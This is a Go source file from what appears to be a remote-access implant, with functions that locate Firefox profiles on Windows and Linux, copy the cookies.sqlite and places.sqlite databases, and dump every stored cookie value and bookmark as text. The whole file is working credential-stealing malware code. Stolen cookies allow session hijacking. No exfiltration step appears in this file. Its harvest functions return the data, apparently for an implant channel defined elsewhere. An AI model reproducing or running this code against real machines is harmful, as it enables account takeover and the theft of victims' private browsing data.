package implant

import (
	"database/sql"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	_ "modernc.org/sqlite"
)

// firefoxProfilesIni returns the path to Firefox's profiles.ini, or "" if not found.
func firefoxProfilesIni() string {
	if runtime.GOOS == "windows" {
		appdata := os.Getenv("APPDATA")
		if appdata == "" {
			return ""
		}
		return filepath.Join(appdata, "Mozilla", "Firefox", "profiles.ini")
	}
	home, err := os.UserHomeDir()
	if err != nil {
		return ""
	}
	return filepath.Join(home, ".mozilla", "firefox", "profiles.ini")
}

// firefoxProfileDirs parses profiles.ini and returns absolute profile directories.
func firefoxProfileDirs(iniPath string) []string {
	data, err := os.ReadFile(iniPath)
	if err != nil {
		return nil
	}
	base := filepath.Dir(iniPath)
	var dirs []string
	lines := strings.Split(string(data), "\n")
	for i := 0; i < len(lines); i++ {
		line := strings.TrimSpace(lines[i])
		if !strings.HasPrefix(line, "Path=") {
			continue
		}
		rel := strings.TrimPrefix(line, "Path=")
		rel = strings.ReplaceAll(rel, "/", string(filepath.Separator))

		// IsRelative is the line immediately preceding Path= in profiles.ini.
		isRelative := true
		for j := i - 1; j >= 0 && j > i-4; j-- {
			t := strings.TrimSpace(lines[j])
			if strings.HasPrefix(t, "IsRelative=") {
				isRelative = strings.TrimPrefix(t, "IsRelative=") == "1"
				break
			}
		}

		dir := rel
		if isRelative {
			dir = filepath.Join(base, rel)
		}
		dirs = append(dirs, dir)
	}
	return dirs
}

// queryFirefoxSQLite copies a browser SQLite DB to a temp file (to avoid lock
// contention with a running browser) and runs a read-only query against it,
// returning the rows formatted as "- column : value" lines.
func queryFirefoxSQLite(path, query string) (string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}

	tmp, err := os.CreateTemp("", "phantom-browser-*.sqlite")
	if err != nil {
		return "", err
	}
	tmpPath := tmp.Name()
	tmp.Close()
	defer os.Remove(tmpPath)

	if err := os.WriteFile(tmpPath, data, 0600); err != nil {
		return "", err
	}

	db, err := sql.Open("sqlite", tmpPath)
	if err != nil {
		return "", err
	}
	defer db.Close()

	rows, err := db.Query(query)
	if err != nil {
		return "", err
	}
	defer rows.Close()

	cols, err := rows.Columns()
	if err != nil {
		return "", err
	}

	var sb strings.Builder
	vals := make([]interface{}, len(cols))
	ptrs := make([]interface{}, len(cols))
	for rows.Next() {
		for i := range vals {
			vals[i] = new(interface{})
			ptrs[i] = vals[i]
		}
		if err := rows.Scan(ptrs...); err != nil {
			continue
		}
		for i, c := range cols {
			fmt.Fprintf(&sb, "- %s : %v\n", c, *(vals[i].(*interface{})))
		}
		sb.WriteString("\n")
	}
	return sb.String(), rows.Err()
}

// harvestFirefoxCookies dumps cookies from every Firefox profile.
func harvestFirefoxCookies() ([]byte, error) {
	ini := firefoxProfilesIni()
	if ini == "" {
		return []byte("Firefox not found (no profiles.ini)"), nil
	}
	dirs := firefoxProfileDirs(ini)
	if len(dirs) == 0 {
		return []byte("No Firefox profiles found"), nil
	}

	var sb strings.Builder
	for _, dir := range dirs {
		sb.WriteString(fmt.Sprintf("=== Profile: %s ===\n", dir))
		dbPath := filepath.Join(dir, "cookies.sqlite")
		if _, err := os.Stat(dbPath); err != nil {
			sb.WriteString("  cookies.sqlite not found\n")
			continue
		}
		out, err := queryFirefoxSQLite(dbPath,
			"SELECT host, path, isSecure, name, datetime(expiry / 1000, 'unixepoch', 'localtime') AS expiry, value FROM moz_cookies;")
		if err != nil {
			sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
			continue
		}
		sb.WriteString(out)
	}
	return []byte(sb.String()), nil
}

// harvestFirefoxBookmarks dumps bookmarks from every Firefox profile.
func harvestFirefoxBookmarks() ([]byte, error) {
	ini := firefoxProfilesIni()
	if ini == "" {
		return []byte("Firefox not found (no profiles.ini)"), nil
	}
	dirs := firefoxProfileDirs(ini)
	if len(dirs) == 0 {
		return []byte("No Firefox profiles found"), nil
	}

	var sb strings.Builder
	for _, dir := range dirs {
		sb.WriteString(fmt.Sprintf("=== Profile: %s ===\n", dir))
		dbPath := filepath.Join(dir, "places.sqlite")
		if _, err := os.Stat(dbPath); err != nil {
			sb.WriteString("  places.sqlite not found\n")
			continue
		}
		out, err := queryFirefoxSQLite(dbPath,
			"SELECT moz_bookmarks.title, moz_places.url FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk = moz_places.id;")
		if err != nil {
			sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
			continue
		}
		sb.WriteString(out)
	}
	return []byte(sb.String()), nil
}
